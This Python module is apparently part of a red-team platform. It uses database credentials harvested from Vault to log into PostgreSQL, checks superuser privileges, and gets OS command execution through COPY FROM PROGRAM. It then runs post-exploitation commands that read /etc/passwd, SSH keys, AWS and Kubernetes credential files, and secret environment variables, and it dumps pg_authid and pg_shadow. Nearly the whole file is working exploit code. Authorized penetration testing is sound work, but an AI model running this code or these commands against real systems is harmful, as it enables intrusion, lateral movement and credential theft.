"""Pivot Engine — Cross-service lateral movement from Vault to backend systems.

Takes credentials harvested from Vault (database connection strings, cloud
IAM keys, Kubernetes tokens) and pivots to the actual backend services.
This is what turns the tool from a "Vault scanner" into a "Red-Team platform".

Phases (escalating):
    1. Extract DB credentials from global DynamicCredentialStore
    2. Connect directly to PostgreSQL / MySQL / MSSQL
    3. Check privilege level (SUPERUSER, CREATEROLE, etc.)
    4. If SUPERUSER → attempt OS command execution via COPY ... PROGRAM
    5. If OS shell → pivot to filesystem, read Vault data dir, SSH keys
    6. Report everything back to findings + global store
"""

from __future__ import annotations

import os
import re
from typing import Any, Optional

from ..context import ExecutionContext
from ..registry import BaseExecutionModule, ExecutionResult, RiskLevel

# ---------------------------------------------------------------------------
# Optional database drivers
# ---------------------------------------------------------------------------

try:
    import psycopg2
    import psycopg2.extensions
    PSYCOPG2_AVAILABLE = True
except ImportError:
    PSYCOPG2_AVAILABLE = False


# ---------------------------------------------------------------------------
# Module
# ---------------------------------------------------------------------------


class PivotEngineModule(BaseExecutionModule):
    """Cross-service pivot: Vault → Database → OS → Infrastructure.

    This is the "real red-team" module. It does not stop at reading
    Vault secrets — it uses them to break into backend systems.
    """

    def __init__(self):
        super().__init__(
            module_id="pivot_engine.cross_service",
            title="Pivot Engine — Database → OS → Infrastructure Lateral Movement",
            risk_level=RiskLevel.DESTRUCTIVE,
            domain="pivot",
            description=(
                "Uses Vault-harvested database credentials to connect to "
                "backend databases, escalate to OS shell via COPY PROGRAM, "
                "and pivot to filesystem/infrastructure. "
                "THIS IS A REAL EXPLOIT — use only on authorized targets."
            ),
            default_enabled=False,
        )

    # ── can_run ──────────────────────────────────────────────────────────

    def can_run(self, context: ExecutionContext) -> bool:
        if not getattr(context, "vault_addr", None):
            return False
        return bool(_collect_db_credentials(context))

    # ── execute ──────────────────────────────────────────────────────────

    def execute(
        self, context: ExecutionContext, params: Optional[dict] = None
    ) -> ExecutionResult:
        params = params or {}
        db_type = params.get("db_type", "postgres").lower()
        target_host = params.get("db_host")
        target_port = params.get("db_port")
        db_name = params.get("db_name", "postgres")
        os_commands = params.get("os_commands")  # explicit commands to run
        timeout = params.get("timeout", 15)
        connect_timeout = params.get("connect_timeout", 10)

        # ── 1. Collect credentials ───────────────────────────────────
        all_creds = _collect_db_credentials(context)
        if not all_creds:
            return ExecutionResult(
                status="failed",
                message="No database credentials available for pivot.",
                evidence={"error": "No DB credentials in global store or context"},
            )

        print(f"\n[*] [PIVOT] Found {len(all_creds)} database credential(s) to try.")
        results: dict[str, Any] = {
            "attempted_connections": 0,
            "successful_connections": [],
            "privilege_escalations": [],
            "os_shells": [],
            "filesystem_access": [],
            "extracted_data": [],
        }

        # ── 2. Try each credential ───────────────────────────────────
        for cred in all_creds:
            host = target_host or cred.get("host", "localhost")
            port = target_port or cred.get("port", 5432)
            username = cred.get("username") or cred.get("user", "")
            password = cred.get("password", "")
            database = db_name

            if not username or not password:
                continue

            results["attempted_connections"] += 1
            print(f"    Trying {username}@{host}:{port}/{database} ...")

            conn = _pg_connect(host, port, database, username, password, connect_timeout)
            if not conn:
                continue

            print(f"    [+] Connected as {username}!")
            conn_info = {
                "host": host, "port": port, "database": database,
                "username": username, "source": cred.get("source", "unknown"),
            }
            results["successful_connections"].append(conn_info)

            try:
                # ── 3. Enumerate privileges ─────────────────────────
                privs = _pg_check_privileges(conn, username)
                print(f"    [+] Privileges: SUPERUSER={privs['is_superuser']}, "
                      f"CREATEROLE={privs['is_createrole']}, "
                      f"CREATEDB={privs['is_createdb']}, "
                      f"REPLICATION={privs['is_replication']}")

                context.add_finding(
                    title="CRITICAL: Database Privilege Enumeration",
                    description=(
                        f"User '{username}' on {host}:{port}/{database} — "
                        f"SUPERUSER={privs['is_superuser']}, "
                        f"CREATEROLE={privs['is_createrole']}"
                    ),
                    severity="CRITICAL" if privs["is_superuser"] else "HIGH",
                    evidence={**conn_info, "privileges": privs},
                )

                if privs["is_superuser"]:
                    results["privilege_escalations"].append({
                        **conn_info,
                        "level": "SUPERUSER",
                        "memberships": privs.get("member_of", []),
                    })

                    # ── 4. OS Shell via COPY PROGRAM ────────────────
                    shell_result = _pg_os_shell(conn, username, os_commands, timeout)
                    if shell_result["success"]:
                        print(f"    [!] OS SHELL OBTAINED on {host}!")
                        results["os_shells"].append({
                            **conn_info,
                            "method": "COPY FROM PROGRAM",
                            "commands_executed": shell_result["commands"],
                            "command_outputs": shell_result["outputs"],
                        })

                        context.add_finding(
                            title="CRITICAL: OS Command Execution via PostgreSQL SUPERUSER",
                            description=(
                                f"OS shell obtained on database server {host} "
                                f"via COPY PROGRAM as PostgreSQL user '{username}'. "
                                f"Executed {len(shell_result['commands'])} command(s)."
                            ),
                            severity="CRITICAL",
                            evidence={
                                **conn_info,
                                "command_outputs": shell_result["outputs"],
                            },
                        )

                        # ── 5. Post-exploitation on filesystem ─────
                        fs_data = _pg_post_exploit_filesystem(
                            conn, host, timeout
                        )
                        if fs_data:
                            results["filesystem_access"].append(fs_data)
                            results["extracted_data"].extend(
                                fs_data.get("findings", [])
                            )

                            context.add_finding(
                                title="CRITICAL: Filesystem Access via PostgreSQL RCE",
                                description=(
                                    f"Read sensitive files on {host} via OS shell. "
                                    f"Vault data: {fs_data.get('vault_data_found', False)}, "
                                    f"SSH keys: {fs_data.get('ssh_keys_found', 0)}, "
                                    f"Cloud creds: {fs_data.get('cloud_creds_found', 0)}"
                                ),
                                severity="CRITICAL",
                                evidence=fs_data.get("summary", {}),
                            )
                    else:
                        print(f"    [-] OS shell failed: {shell_result.get('error')}")

                # ── 6. Read sensitive DB tables ────────────────────
                sensitive = _pg_read_sensitive_tables(conn)
                if sensitive:
                    results["extracted_data"].extend(sensitive)
                    for item in sensitive[:5]:
                        context.add_finding(
                            title=f"HIGH: Sensitive Data Extracted — {item.get('table', '')}",
                            description=(
                                f"Read {item.get('row_count', 0)} rows from "
                                f"'{item.get('table', '?')}' on {host}."
                            ),
                            severity="HIGH",
                            evidence=item.get("sample", {}),
                        )

            finally:
                try:
                    conn.close()
                except Exception:
                    pass

        # ── 7. Summary ──────────────────────────────────────────────
        return ExecutionResult(
            status="success" if results["successful_connections"] else "failed",
            message=(
                f"Pivot engine: {results['attempted_connections']} attempted, "
                f"{len(results['successful_connections'])} connected, "
                f"{len(results['os_shells'])} OS shells, "
                f"{len(results['filesystem_access'])} filesystem pivots"
            ),
            evidence=results,
        )


# ---------------------------------------------------------------------------
# Credential collection
# ---------------------------------------------------------------------------


def _collect_db_credentials(context: ExecutionContext) -> list[dict]:
    """Gather all database credentials from every available source."""
    creds: list[dict] = []

    # 1. Global DynamicCredentialStore
    try:
        from ai_core.dynamic_session import global_store
        for key, rec in global_store.credentials.items():
            if rec.cred_type in ("db_conn", "password"):
                creds.append({
                    "username": rec.metadata.get("username", rec.metadata.get("user", "")),
                    "password": rec.metadata.get("password", rec.value),
                    "host": rec.metadata.get("host", ""),
                    "port": rec.metadata.get("port", 5432),
                    "source": f"global_store:{rec.source}",
                })
    except ImportError:
        pass

    # 2. Context findings with database evidence
    for finding in getattr(context, "findings", []):
        evidence = finding.get("evidence", {})
        # Direct credential dict
        for key in ("credentials", "db_credentials", "connection_strings"):
            for entry in evidence.get(key, []):
                if isinstance(entry, dict) and ("password" in entry or "pass" in entry):
                    creds.append({
                        "username": entry.get("username", entry.get("user", "")),
                        "password": entry.get("password", entry.get("pass", "")),
                        "host": entry.get("host", entry.get("hostname", "")),
                        "port": entry.get("port", 5432),
                        "source": f"context_finding:{key}",
                    })

        # Connection string parsing
        conn_str = evidence.get("connection_string", evidence.get("dsn", ""))
        if conn_str:
            parsed = _parse_connection_string(str(conn_str))
            if parsed:
                creds.append(parsed)

    # 3. Context.db_credentials attribute
    for entry in getattr(context, "db_credentials", []) or []:
        if isinstance(entry, dict):
            creds.append({
                "username": entry.get("username", entry.get("user", "")),
                "password": entry.get("password", entry.get("pass", "")),
                "host": entry.get("host", ""),
                "port": entry.get("port", 5432),
                "source": "context.db_credentials",
            })

    # 4. Secret exfiltration leaked payloads
    for finding in getattr(context, "findings", []):
        evidence = finding.get("evidence", {})
        payloads = evidence.get("leaked_payloads", {})
        for path, secrets in payloads.items():
            if isinstance(secrets, dict):
                user = secrets.get("username", secrets.get("user", ""))
                pw = secrets.get("password", secrets.get("pass", ""))
                host = secrets.get("host", secrets.get("hostname", ""))
                if pw and (user or "postgres" in str(secrets).lower()):
                    creds.append({
                        "username": user or "postgres",
                        "password": pw,
                        "host": host or "",
                        "port": secrets.get("port", 5432),
                        "source": f"secret_exfil:{path}",
                    })

    # Deduplicate by (host, username, password)
    seen = set()
    unique: list[dict] = []
    for c in creds:
        key = (c.get("host"), c.get("username"), c.get("password", "")[:8])
        if key not in seen:
            seen.add(key)
            unique.append(c)

    return unique


def _parse_connection_string(cs: str) -> dict | None:
    """Parse a PostgreSQL connection string like postgresql://user:pass@host:port/db"""
    m = re.match(
        r'(?:postgres(?:ql)?|mysql)://'
        r'([^:]+):([^@]+)@'
        r'([^:/]+)(?::(\d+))?'
        r'(?:/(\w+))?',
        cs, re.IGNORECASE,
    )
    if m:
        return {
            "username": m.group(1),
            "password": m.group(2),
            "host": m.group(3),
            "port": int(m.group(4)) if m.group(4) else 5432,
            "database": m.group(5) or "postgres",
            "source": "connection_string_parse",
        }
    return None


# ---------------------------------------------------------------------------
# PostgreSQL operations
# ---------------------------------------------------------------------------


def _pg_connect(
    host: str, port: int, database: str,
    username: str, password: str, timeout: int = 10,
):
    """Connect to PostgreSQL. Returns connection or None."""
    if not PSYCOPG2_AVAILABLE:
        print("    [!] psycopg2 not installed. Run: pip install psycopg2-binary")
        return None

    try:
        conn = psycopg2.connect(
            host=host,
            port=port,
            database=database,
            user=username,
            password=password,
            connect_timeout=timeout,
        )
        conn.autocommit = True
        return conn
    except Exception as exc:
        print(f"    [-] Connection failed: {exc}")
        return None


def _pg_check_privileges(conn, username: str) -> dict:
    """Check PostgreSQL user privileges via pg_roles and pg_authid."""
    info = {
        "username": username,
        "is_superuser": False,
        "is_createrole": False,
        "is_createdb": False,
        "is_replication": False,
        "member_of": [],
        "can_login": True,
    }

    try:
        cur = conn.cursor()

        # Main privilege query — uses pg_catalog.pg_roles (safer than pg_authid)
        cur.execute("""
            SELECT r.rolname, r.rolsuper, r.rolcreaterole, r.rolcreatedb,
                   r.rolreplication, r.rolcanlogin, r.rolbypassrls
            FROM pg_catalog.pg_roles r
            WHERE r.rolname = current_user
        """)
        row = cur.fetchone()
        if row:
            info["is_superuser"] = bool(row[1])
            info["is_createrole"] = bool(row[2])
            info["is_createdb"] = bool(row[3])
            info["is_replication"] = bool(row[4])
            info["can_login"] = bool(row[5])
            info["rolbypassrls"] = bool(row[6])

        # Role memberships
        cur.execute("""
            SELECT r.rolname
            FROM pg_catalog.pg_roles r
            JOIN pg_catalog.pg_auth_members m ON r.oid = m.roleid
            JOIN pg_catalog.pg_roles u ON u.oid = m.member
            WHERE u.rolname = current_user
        """)
        info["member_of"] = [r[0] for r in cur.fetchall()]

        # Check if member of pg_execute_server_program (required for COPY PROGRAM)
        cur.execute("""
            SELECT has_function_privilege(
                current_user, 'pg_read_file(text)', 'EXECUTE'
            ) as can_read_file,
            has_function_privilege(
                current_user, 'pg_read_binary_file(text)', 'EXECUTE'
            ) as can_read_binary,
            pg_catalog.pg_is_other_temp_schema(0) as dummy
        """)
        priv_row = cur.fetchone()
        info["can_read_file"] = bool(priv_row[0]) if priv_row else False

        # SUPERUSER or pg_execute_server_program role needed for COPY PROGRAM
        info["can_copy_program"] = (
            info["is_superuser"]
            or "pg_execute_server_program" in info["member_of"]
        )

        cur.close()
    except Exception as exc:
        print(f"    [!] Privilege check error: {exc}")
        # Fallback: try executing a harmless function to probe
        try:
            cur2 = conn.cursor()
            cur2.execute("SELECT current_setting('is_superuser')")
            info["is_superuser"] = cur2.fetchone()[0] == "on"
            cur2.close()
        except Exception:
            pass

    return info


def _pg_os_shell(
    conn, username: str,
    explicit_commands: list[str] | None = None,
    timeout: int = 15,
) -> dict:
    """Attempt OS command execution via PostgreSQL COPY FROM PROGRAM.

    Requires SUPERUSER or membership in pg_execute_server_program role.

    Uses COPY ... FROM PROGRAM which executes a shell command and
    captures its stdout into a temp table. This is the standard
    PostgreSQL SUPERUSER RCE vector.
    """
    result: dict = {"success": False, "commands": [], "outputs": {}}

    commands = explicit_commands or [
        "whoami",
        "hostname",
        "uname -a",
        "id",
        "ls -la /opt/vault/data/ 2>/dev/null || ls -la /vault/data/ 2>/dev/null || echo 'NO_VAULT_DATA'",
        "cat /etc/passwd | head -5",
        "ls -la /home/ 2>/dev/null || ls -la /root/ 2>/dev/null || echo 'NO_HOME'",
        "find / -name '*.pem' -o -name 'id_rsa' -o -name '*.key' 2>/dev/null | head -10",
        "env | grep -iE 'AWS_|AZURE_|GCP_|K8S_|VAULT_' | head -10",
        "netstat -tlnp 2>/dev/null || ss -tlnp 2>/dev/null | head -10",
    ]

    for cmd in commands:
        output = _pg_capture_command_output(conn, cmd, timeout)
        if output and not output.startswith("[capture failed") and not output.startswith("ERROR:"):
            result["outputs"][cmd] = output
            result["commands"].append(cmd)
            result["success"] = True
            print(f"    [+] Executed: {cmd[:60]}...")
            preview = output[:120].replace('\n', ' | ')
            print(f"        {preview}")
        else:
            error_msg = output or "unknown error"
            print(f"    [-] CMD failed for '{cmd[:50]}...': {error_msg[:100]}")
            result["outputs"][cmd] = error_msg

    return result


def _pg_capture_command_output(conn, cmd: str, timeout: int = 15) -> str:
    """Capture output from a shell command via COPY FROM PROGRAM.

    ``COPY table FROM PROGRAM 'cmd'`` executes 'cmd' via the shell and
    copies its stdout into the table.  We create a temp table, run the
    command, read the captured output, and clean up.
    """
    try:
        cur = conn.cursor()
        escaped_cmd = cmd.replace("'", "''")
        cur.execute(f"SET LOCAL statement_timeout = '{timeout * 1000}'")

        # Create temp table
        cur.execute("CREATE TEMP TABLE IF NOT EXISTS _pivot_out (line text)")
        cur.execute("TRUNCATE _pivot_out")

        # COPY FROM PROGRAM — runs the command, captures stdout
        cur.execute(f"COPY _pivot_out FROM PROGRAM '{escaped_cmd}'")

        # Read captured output
        cur.execute("SELECT line FROM _pivot_out LIMIT 100")
        rows = cur.fetchall()

        # Cleanup
        cur.execute("DROP TABLE IF EXISTS _pivot_out")
        cur.close()

        return "\n".join(r[0] for r in rows if r[0])
    except Exception as exc:
        return f"[capture failed: {exc}]"


def _pg_post_exploit_filesystem(conn, host: str, timeout: int = 20) -> dict | None:
    """After obtaining OS shell, run post-exploitation recon on filesystem."""
    findings: list[dict] = []
    vault_data_found = False
    ssh_keys_found = 0
    cloud_creds_found = 0

    recon_commands = {
        "vault_data": "ls -laR /opt/vault/data/ 2>/dev/null || ls -laR /vault/data/ 2>/dev/null || echo 'NOT_FOUND'",
        "vault_config": "cat /opt/vault/config/*.hcl 2>/dev/null || cat /etc/vault.d/*.hcl 2>/dev/null || echo 'NOT_FOUND'",
        "ssh_keys": "find /home /root -name 'id_rsa' -o -name '*.pem' 2>/dev/null | head -20",
        "aws_creds": "cat ~/.aws/credentials 2>/dev/null || echo 'NOT_FOUND'",
        "env_secrets": "env 2>/dev/null | grep -iE 'SECRET|TOKEN|KEY|PASS' | head -15",
        "kube_config": "cat ~/.kube/config 2>/dev/null || echo 'NOT_FOUND'",
        "processes": "ps aux 2>/dev/null | head -20",
        "network": "netstat -tlnp 2>/dev/null || ss -tlnp 2>/dev/null | head -15",
        "crontab": "crontab -l 2>/dev/null || echo 'NO_CRON'",
    }

    outputs: dict[str, str] = {}
    for name, cmd in recon_commands.items():
        out = _pg_capture_command_output(conn, cmd, timeout)
        outputs[name] = out
        if out and "NOT_FOUND" not in out and out.strip():
            if name == "vault_data":
                vault_data_found = True
            elif name == "ssh_keys":
                ssh_keys_found = len([l for l in out.split("\n") if l.strip()])
            elif name in ("aws_creds", "env_secrets", "kube_config"):
                cloud_creds_found += 1

            findings.append({
                "phase": "post_exploit",
                "target": name,
                "data_preview": out[:300],
            })

    return {
        "host": host,
        "vault_data_found": vault_data_found,
        "ssh_keys_found": ssh_keys_found,
        "cloud_creds_found": cloud_creds_found,
        "outputs": outputs,
        "findings": findings,
        "summary": {
            "vault_data_accessible": vault_data_found,
            "ssh_keys_discovered": ssh_keys_found,
            "cloud_credentials_discovered": cloud_creds_found,
            "total_recon_commands": len(recon_commands),
        },
    }


def _pg_read_sensitive_tables(conn) -> list[dict]:
    """Read password hashes and sensitive data from PostgreSQL system tables."""
    results: list[dict] = []
    queries = [
        (
            "pg_authid",
            "SELECT rolname, rolsuper, rolpassword IS NOT NULL as has_password "
            "FROM pg_catalog.pg_authid LIMIT 20",
        ),
        (
            "pg_shadow",
            "SELECT usename, passwd IS NOT NULL as has_hash "
            "FROM pg_catalog.pg_shadow LIMIT 20",
        ),
        (
            "user_tables",
            "SELECT schemaname, tablename, "
            "pg_size_pretty(pg_total_relation_size(schemaname||'.'||tablename)) as size "
            "FROM pg_catalog.pg_tables "
            "WHERE schemaname NOT IN ('pg_catalog', 'information_schema') "
            "ORDER BY pg_total_relation_size(schemaname||'.'||tablename) DESC LIMIT 30",
        ),
    ]

    for table_name, query in queries:
        try:
            cur = conn.cursor()
            cur.execute(query)
            rows = cur.fetchall()
            cols = [desc[0] for desc in cur.description]
            cur.close()

            if rows:
                sample = []
                for row in rows[:5]:
                    sample.append(dict(zip(cols, [str(v) for v in row])))
                results.append({
                    "table": table_name,
                    "row_count": len(rows),
                    "columns": cols,
                    "sample": sample,
                })
        except Exception as exc:
            print(f"    [!] Could not read {table_name}: {exc}")

    return results


# ---------------------------------------------------------------------------
# Registration helper
# ---------------------------------------------------------------------------


def register_pivot_engine(registry) -> None:
    """Register the pivot engine module with the active execution registry."""
    registry.register(PivotEngineModule())
